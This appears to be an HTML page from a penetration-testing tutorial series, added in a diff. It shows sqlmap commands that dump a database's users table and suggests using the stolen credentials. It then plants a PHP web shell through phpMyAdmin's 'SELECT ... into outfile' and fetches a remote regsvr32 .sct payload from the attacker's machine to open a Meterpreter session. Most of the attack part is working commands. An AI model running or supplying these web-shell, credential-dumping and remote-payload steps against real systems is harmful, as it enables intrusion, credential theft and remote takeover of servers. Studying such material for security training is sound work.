@@ -1,0 +1,225 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<style>
+body {
+  font-family: "Lato", sans-serif;
+}
+
+.sidenav {
+  height: 100%;
+  width: 230px;
+  position: fixed;
+  z-index: 1;
+  top: 0;
+  left: 0;
+  background-color: #111;
+  overflow-x: scroll;
+  padding-top: 20px;
+}
+
+.main {
+        height: 100%;
+        width: 1010px;
+        position: fixed;
+        z-index: 1;
+        top: 0;
+        left: 0;
+        background-color: #fff;
+        overflow-x: scroll;
+        overflow-y: scroll;
+        padding-top: 0px;
+	float: center;
+    }
+
+
+.sidenav a {
+  padding: 6px 8px 6px 16px;
+  text-decoration: none;
+  font-size: 15px;
+  color: white;
+  display: block;
+}
+
+.sidenav a:hover {
+  color: red;
+}
+
+.main {
+  margin-left: 240px; /* Same as the width of the sidenav */
+  font-size: 30px; /* Increased text to enable scrolling */
+  padding: 0px 10px;
+}
+
+@media screen and (max-height: 450px) {
+  .sidenav {padding-top: 15px;}
+  .sidenav a {font-size: 18px;}
+}
+</style>
+</head>
+<body>
+<div class="sidenav">
+</div>
+<div class="sidenav">
+<a href="1.html">🌐【WordPress Penetration Testing】🖧</a>
+  <a href="2.html">🌐【PenTesting Lab Setup: Squid Proxy &  Burpsuite Payloads】🖧</a>
+  <a href="3.html">🌐【Beginner Guide to Google Dorks】🖧</a>
+  <a href="4.html">🌐【Introduction to Command Injection】🖧</a>
+ <a href="5.html">🌐【WebServer Shell-ing through PhpMyAdmin】🖧</a>
+  <a href="6.html">🌐【Comprehensive Guide on FFUF & HTTPX】🖧</a>
+  <a href="7.html">🌐【Comprehensive Guide on HTML & XXE Injection】🖧</a>
+<a href="8.html">🌐【NetCat for PenTesting & Web Framework Reverse Shell】🖧</a>
+  <a href="9.html">🌐【Web Shells Penetration Testing】🖧</a>
+  <a href="10.html">🌐【Database Penetration Testing】🖧</a>
+ <p align="center"><img src="https://pwa-audio-player.digitalskeleton.com.ng/p.jpg" height="90" width="200"></p>
+</div>
+<div class="main">
+<div class="markdown-heading" dir="auto">
+<h3 class="heading-element" dir="auto" tabindex="-1"><p align="left">🌐WebServer Shell-ing through PhpMyAdmin🖧</p></h3>
+<p>sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.</p>
+<p><strong>Features</strong></p>
+<ul>
+<li>Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, HSQLDB and Informix database management systems.</li>
+<li>Full support for six SQL injection techniques: boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries and out-of-band.</li>
+<li>Support to directly connect to the database without passing via a SQL injection, by providing DBMS credentials, IP address, port, and database name.</li>
+<li>Support to enumerate users, password hashes, privileges, roles, databases, tables, and columns.</li>
+<li>Automatic recognition of password hash formats and support for cracking them using a dictionary-based attack.</li>
+<li>Support to dump database tables entirely, a range of entries or specific columns as per user&rsquo;s choice. The user can also choose to dump only a range of characters from each column&rsquo;s entry.</li>
+<li>Support to search for specific database names, specific tables across all databases or specific columns across all databases&rsquo; tables. This is useful, for instance, to identify tables containing custom application credentials where relevant columns&rsquo; names contain a string like a name and pass.</li>
+<li>Support to download and upload any file from the database server underlying file system when the database software is MySQL, PostgreSQL or Microsoft SQL Server.</li>
+<li>Support to execute arbitrary commands and retrieve their standard output on the database server underlying operating system when the database software is MySQL, PostgreSQL or Microsoft SQL Server.</li>
+<li>Support to establish an out-of-band stateful TCP connection between the attacker machine and the database server underlying operating system. This channel can be an interactive command prompt, a Meterpreter session or a graphical user interface (VNC) session as per user&rsquo;s choice.</li>
+<li>Support for database process&rsquo; user privilege escalation via Metasploit&rsquo;sMeterpreter getsystem command.</li>
+</ul>
+<p><img src="https://1.bp.blogspot.com/-9HtUEJZSLpM/WVSm8efMwGI/AAAAAAAAQUg/ZOs-ZUDUZBwcU8Oj92buUrvP0ahv9GFZgCLcBGAs/s1600/1.png" alt="" /></p>
+<p>These options can be used to enumerate the back-end database management system information, structure, and data contained in the tables.</p>
+<p><img src="https://1.bp.blogspot.com/-ApSI58k2AJE/WVSm_F4bhjI/AAAAAAAAQUw/4iwJ8dhSzf8WlKpl2wQeGvn0xfnoABgeQCLcBGAs/s1600/2.png" alt="" /></p>
+<p>Sometimes you visit such websites that let you select product item through their picture gallery if you observer its URL you will notice that product item is called through its product-ID numbers.</p>
+<p>Let&rsquo;s take an example</p>
+<pre class="lang:default decode:true ">http://testphp.vulnweb.com/artists.php?artist=1</pre>
+<p>So when attacker visits such kind of website he always checks for SQL vulnerability inside web server for lunching SQL attack.</p>
+<p><img src="https://4.bp.blogspot.com/-uz3Eu3vN9ME/WVSm--FqHFI/AAAAAAAAQUo/7WVGYJhJrrM6BXRaiRJzBEdlwzQKPVOdQCEwYBhgL/s1600/3.png" alt="" /></p>
+<p>Let&rsquo;s check how attacker verifies SQL vulnerability.</p>
+<p>The attacker will try to break the query in order to order to get the error message, if he successfully received an error message then it confirms that web server is SQL injection affected.</p>
+<pre class="lang:default decode:true ">http://testphp.vulnweb.com/artists.php?artist=1'
+</pre>
+<p><strong>&nbsp;</strong>From the screenshot you can see we have received error message successfully now we have made SQL attack on a web server so that we can fetch database information.</p>
+<p><img src="https://4.bp.blogspot.com/-HZ6UYF8iG_w/WVSm_sFrDdI/AAAAAAAAQU0/pja2aw136O0Naj3vj4_NRk_0lw5hEQUrQCEwYBhgL/s1600/4.1.png" alt="" /></p>
+<h3><strong>Databases</strong></h3>
+<p><strong>&nbsp;</strong>For database penetration testing we always choose SQLMAP, this tool is very helpful for beginners who are unable to retrieve database information manually or unaware of SQL injection techniques.</p>
+<p>Open the terminal in your Kali Linux and type following command which start SQL injection attack on the targeted website. &nbsp;</p>
+<pre class="lang:default decode:true">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch</pre>
+<p><strong>&nbsp;</strong><strong>-u:&nbsp;&nbsp;</strong>target URL</p>
+<p><strong>&ndash;dbs:&nbsp;</strong>fetch database name</p>
+<p><strong>&ndash;batch:</strong>&nbsp;This will leave sqlmap to go with default behavior whenever user&rsquo;s input would be required</p>
+<p><img src="https://4.bp.blogspot.com/-Gbn0wr3FuNc/WVSnB93AICI/AAAAAAAAQVA/xAZ9B5tsz-cSJ2Y9SA1Rnf0QZEiKuqVJgCEwYBhgL/s1600/4.png" alt="" /></p>
+<p>Here from the given screenshot, you can see we have successfully retrieve database name &ldquo;<strong>acuart</strong>&rdquo;</p>
+<p><img src="https://3.bp.blogspot.com/-muzoRZzdB2Y/WVSnAX3VzdI/AAAAAAAAQU4/6_EXktBeZyk-cC0zS-DxrV-Z3FiUi5rCgCEwYBhgL/s1600/5.png" alt="" /></p>
+<h3><strong>Tables</strong></h3>
+<p>As we know a database is a set of record which consist of multiple tables inside it therefore now use another command in order to fetch entire table names from inside the database system.</p>
+<pre class="lang:default decode:true ">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch
+</pre>
+<p><strong>&nbsp;</strong><strong>-D:&nbsp;</strong>DBMS database to enumerate (fetched database name)</p>
+<p><strong>&ndash;tables:&nbsp;</strong>enumerate DBMS database table</p>
+<p><img src="https://3.bp.blogspot.com/-3K7pANIaCUc/WVSnA8tzcMI/AAAAAAAAQU8/0OuGt7_-lMQgxjeLVsx7Dved7IgY5OdvQCEwYBhgL/s1600/6.png" alt="" /></p>
+<p>As a result, given in screenshot, we have enumerated entire table name of the database system. There are 8 tables inside the database &ldquo;acuart&rdquo; as following:</p>
+<p><strong>T1: artists</strong></p>
+<p><strong>T2: carts</strong></p>
+<p><strong>T3: categ</strong></p>
+<p><strong>T4: featured</strong></p>
+<p><strong>T5: guestbook</strong></p>
+<p><strong>T6: pictures</strong></p>
+<p><strong>T7: products</strong></p>
+<p><strong>T8: users</strong></p>
+<p><img src="https://1.bp.blogspot.com/-0U2Nqsb2VVY/WVSnByXoAZI/AAAAAAAAQVE/IIk5DBZhzUc_O7HD0KBV0Ey6v_5eDEOTACEwYBhgL/s1600/7.png" alt="" /></p>
+<h3><strong>Columns</strong></h3>
+<p>Now further we will try to enumerate the column name of the desired table. Since we know there is a users table inside the database acuart and we want to know all column names of users table, therefore, we will generate another command for column captions enumeration.</p>
+<pre class="lang:default decode:true">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
+</pre>
+<p><strong>-T:&nbsp;</strong>DBMS table to enumerate (fetched table name)</p>
+<p><strong>&ndash;columns:</strong>&nbsp;enumerate DBMS database columns</p>
+<p><img src="https://4.bp.blogspot.com/-M2Hu_CWI-DE/WVSnCIwsaiI/AAAAAAAAQVI/8FWaciNSr4ETkiukBVZUQi0spRDF528uQCEwYBhgL/s1600/8.png" alt="" /></p>
+<p><img src="https://3.bp.blogspot.com/-mF7LRkA5V6c/WVSnC0HF8NI/AAAAAAAAQVM/ATKwYZ76kRIhiw90iDvwD6gWWeUtKEbnwCEwYBhgL/s1600/9.png" alt="" /></p>
+<h3><strong>Get data from a table</strong></h3>
+<p>Slowly and gradually we have penetrated many details of the database but last and most important step is to retrieve information from inside the columns of a table. Hence, at last, we will generate a command which will dump information of users table.</p>
+<pre class="lang:default decode:true">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
+</pre>
+<p><strong>&ndash;dump:</strong>&nbsp;dump all information of DBMS database</p>
+<p><img src="https://2.bp.blogspot.com/-C-EXVS1NW8c/WVSm736cNdI/AAAAAAAAQUY/N79z2iO2LT08571Ha446gbgFFKi-WDClwCEwYBhgL/s1600/10.png" alt="" /></p>
+<p>Here from the given screenshot, you can see it has to dump entire information of table users, mainly users table contains login credential of other users. You can use these credential for login into the server on behalf of other users.</p>
+<p><img src="https://2.bp.blogspot.com/-gYMKw2iLsb4/WVSm8TjcEBI/AAAAAAAAQUc/t20gImkvMv0TzCcqk53gxzvG2ckB1_HmgCEwYBhgL/s1600/12.png" alt="" /></p>
+<h3><strong>Dump All</strong></h3>
+<p>The last command is the most powerful command in sqlmap which will save your time in database penetration testing; this command will perform all the above functions at once and dump entire database information including table names, column and etc.</p>
+<pre class="lang:default decode:true ">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch</pre>
+<p><img src="https://3.bp.blogspot.com/-p1BQZl2HZMU/WVSm88fCI6I/AAAAAAAAQUk/KBvXd6QfL1INTlydOKHR6AGAa_1NeydjACEwYBhgL/s1600/13.png" alt="" /></p>
+<p>This will give you all information at once which contains database name as well as table&rsquo;s records.</p>
+<p>Try it yourself!!!</p>
+<p><img src="https://4.bp.blogspot.com/-4XCG8vhqAhI/WVSm_LWBA6I/AAAAAAAAQUs/0xmoiYXpZpgBNoN4Aj9MSViX0S3C7ak0QCEwYBhgL/s1600/14.png" alt="" /></p>
+<p>In this guide, we will learn how to exploit a web server if we found the phpmyadmin panel has been left open. Here I will try to exploit phpmyadmin which is running inside the localhost &ldquo;xampp&rdquo; by generating a SQL query to execute malicious code and then make an effort to access the shell of victim&rsquo;s Pc.</p>
+<p>PhpMyAdmin is a free software tool written in&nbsp;PHP, intended to handle the administration of&nbsp;MySQL&nbsp;over the Web. phpMyAdmin supports a wide range of operations on MySQL and MariaDB. Frequently used operations (managing databases, tables, columns, relations, indexes, users, permissions, etc) can be performed via the user interface, while you still have the ability to directly execute any SQL statement.</p>
+<h3><strong>Features</strong></h3>
+<ul>
+<li>Intuitive web interface</li>
+<li>Support for most MySQL features:</li>
+<li>browse and drop databases, tables, views, fields, and indexes</li>
+<li>create, copy, drop, rename and alter databases, tables, fields, and indexes</li>
+<li>maintenance server, databases, and tables, with proposals on server configuration</li>
+<li>execute, edit and bookmark any SQL-statement, even batch-queries</li>
+<li>manage MySQL user accounts and privileges</li>
+<li>manage stored procedures and triggers</li>
+<li>Import data from CSV&nbsp;and&nbsp;SQL</li>
+<li>Export data to various formats: CSV,&nbsp;SQL,&nbsp;XML,&nbsp;PDF,&nbsp;ISO/IEC&nbsp;26300 &ndash; OpenDocument Text and Spreadsheet,&nbsp;Word, L<sup>A</sup>T<em><sub>E</sub></em>X, and others</li>
+<li>Administering multiple servers</li>
+<li>Creating graphics of your database layout in various formats</li>
+<li>Creating complex queries using Query-by-example (QBE)</li>
+<li>Searching globally in a database or a subset of it</li>
+<li>Transforming stored data into any format using a set of predefined functions, like displaying BLOB-data as image or download-link</li>
+</ul>
+<p><strong>For information visit:&nbsp;</strong><strong>https://www.phpmyadmin.net</strong></p>
+<p><strong>Let&rsquo;s start!!!</strong></p>
+<p>Open the localhost address:<strong>192.168.1.101:81</strong>&nbsp;in the browser and&nbsp;<strong>select</strong>&nbsp;the option&nbsp;<strong>phpmyadmin</strong>&nbsp;from the given list of xampp as shown the following screenshot.</p>
+<p><img src="https://4.bp.blogspot.com/-7tT92svTlFI/WJHxh4cBCNI/AAAAAAAAPJ0/iQrNSEdk_vQZ48Qde09mgtdunhi-5sV2gCLcB/s1600/1.png" alt="" /></p>
+<p>When you come into PhpMyAdmin application, here you will find different areas. On the left side of the screen, you can see the list of database names. As we are inside the administration console where we can perform multiple tasks which I have defined above, therefore, I am going to create a new database</p>
+<p><strong>Now click on new to create a database</strong>.</p>
+<p><img src="https://3.bp.blogspot.com/-0YypcxAFS1c/WJHxilXNCaI/AAAAAAAAPKA/Ko0qZMMKUFcc7dIcK0zbFHRypUTctv07QCLcB/s1600/2.png" alt="" /></p>
+<p>Give a name to your&nbsp;<strong>database</strong>&nbsp;as I have given&nbsp;<strong>Ignite technologies</strong>&nbsp;and&nbsp;<strong>click</strong>&nbsp;on&nbsp;<strong>create</strong>.</p>
+<p><img src="https://2.bp.blogspot.com/-UwkBXnvM4HQ/WJHxiwRpaPI/AAAAAAAAPKE/-7lR_kqt6C0SxSl1WnpnaSXZD_D5yo4ggCLcB/s1600/3.png" alt="" /></p>
+<p>Now you can see the database ignite technologies has been added in the list of databases.</p>
+<p><img src="https://2.bp.blogspot.com/-UwkBXnvM4HQ/WJHxiwRpaPI/AAAAAAAAPKE/-7lR_kqt6C0SxSl1WnpnaSXZD_D5yo4ggCLcB/s1600/3.png" alt="" /></p>
+<p><strong>Click</strong>&nbsp;on&nbsp;<strong>ignite technologies</strong>&nbsp;database to construct an MYSQL query inside your database. Hence&nbsp;<strong>click</strong>&nbsp;on&nbsp;<strong>SQL</strong>&nbsp;tab where you can enter the SQL query code.</p>
+<p><img src="https://3.bp.blogspot.com/-O1FXlgzZmIw/WJHxjDIgVmI/AAAAAAAAPKM/DbURkkXULckBU-6S8KXo5-0Pyldmw0lbQCLcB/s1600/4.png" alt="" /></p>
+<p><strong>Click</strong>&nbsp;on&nbsp;<strong>ignite technologies</strong>&nbsp;database to construct an MYSQL query inside your database. Hence&nbsp;<strong>click</strong>&nbsp;on&nbsp;<strong>SQL</strong>&nbsp;tab where you can enter the SQL query code.</p>
+<p><img src="https://1.bp.blogspot.com/-FfYAJvKQzyc/WJHxjDXUaoI/AAAAAAAAPKI/Y89Mc_VUESMmrsMkzQFgsXmThzMJuf6FACLcB/s1600/5.png" alt="" /></p>
+<p>Now, this is an interesting part because here I am going to execute malicious code as SQL query which will create a command shell vulnerability inside the web server.&nbsp;</p>
+<pre class="lang:default decode:true">SELECT "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "C:\\xampp\\htdocs\\backdoor.php"</pre>
+<p>In the following screenshot, you can see I have given above malicious php code as SQL query and then&nbsp;<strong>click&nbsp;</strong>on&nbsp;<strong>GO&nbsp;</strong>tab to execute it.</p>
+<p><img src="https://2.bp.blogspot.com/-L_1aPCALgtk/WJHxjmAQlPI/AAAAAAAAPKQ/5QG5wqQFtsIGTj-8esCni-_7F1JP_-QtwCLcB/s1600/6.png" alt="" /></p>
+<p>Now type the following URL to find whether we are successful or not in order to create OS command shell vulnerability.</p>
+<pre class="lang:default decode:true">http://192.168.1.101:81/backdoor.php</pre>
+<p><strong>Awesome!!!&nbsp;&nbsp;</strong>You can see it has given a warning which means we had successfully created OS command shell vulnerability.</p>
+<p><img src="https://4.bp.blogspot.com/-Br2y8ubyasU/WJHxjuXHWcI/AAAAAAAAPKU/TC6MllNT20IKbXIT5VV5wqM8UnhvXV4gACLcB/s1600/7.png" alt="" /></p>
+<pre class="lang:default decode:true">http://192.168.1.101:81/backdoor.php?cmd=dir</pre>
+<p>When you execute the above URL in the browser you will get the information of victim&lsquo;s PC directories.</p>
+<p><img src="https://1.bp.blogspot.com/-XNyuf2L_hlU/WJHxjoXRnkI/AAAAAAAAPKY/8lIJB3LmVsEHX5NkLEMEVWe3RJ7y5QtWQCLcB/s1600/9.png" alt="" /></p>
+<p>Next step will achieve a meterpreter session of victim&rsquo;s Pc.&nbsp;Open another terminal in Kali Linux and type following command.&nbsp;<strong>msfconsole</strong></p>
+<pre class="lang:default decode:true">msf &gt; use exploit/windows/misc/regsvr32_applocker_bypass_server
+msf exploit(regsvr32_applocker_bypass_server) &gt; set lhost 192.168.1.104
+msf exploit(regsvr32_applocker_bypass_server) &gt; set lport 4444
+msf exploit(regsvr32_applocker_bypass_server) &gt; exploit</pre>
+<p>Copy the selected part for the&nbsp;<strong>DLL&nbsp;</strong>file and use this malicious code as the command inside the URL.</p>
+<pre class="lang:default decode:true">regsvr32 /s /n /u / i:http://192.168.1.104:8080/sVW72p3IRZBScv.sct%20scrobj.dll</pre>
+<p><img src="https://1.bp.blogspot.com/-K9pOiHYouLM/WJHxh5n82BI/AAAAAAAAPJw/Af5zqdPFfxY3lxPr928OJs_Jk9vUd789gCLcB/s1600/10.png" alt="" /></p>
+<p>Paste the above code the URL and execute it which will give a meterpreter session on Metasploit</p>
+<pre class="lang:default decode:true ">http://192.168.1.101:81/backdoor.php?cmd=regsvr32 /s /n /u / i:http://192.168.1.104:8080/sVW72p3IRZBScv.sct%20scrobj.dll</pre>
+<p><img src="https://1.bp.blogspot.com/-InFww2BeG2M/WJHxh0GHm5I/AAAAAAAAPJs/Xi_dOl1nmNk-HGXXs7FND0YTI9v8EaTtQCLcB/s1600/11.png" alt="" /></p>
+<p>From the following screenshot, you can see meterpreter<strong>&nbsp;session 1</strong>&nbsp;opened.</p>
+<p><img src="https://1.bp.blogspot.com/-SNb_4UaFYX0/WJHxialMR_I/AAAAAAAAPJ4/H7NEWJedpJ4oA9gTB_tcJi6dh_thJYNjgCLcB/s1600/12.png" alt="" /></p>
+<pre class="lang:default decode:true ">sessions &ndash;i 1
+meterpreter&gt;sysinfo</pre>
+<p><img src="https://1.bp.blogspot.com/-VxJd7Bf_Thw/WJHxiXFXwhI/AAAAAAAAPJ8/twvarzjUpUc9XH3Y8dCPt6OBta3-bcndACLcB/s1600/13.png" alt="" /></p>
+</div>
+</div>
+</body>
+</html>
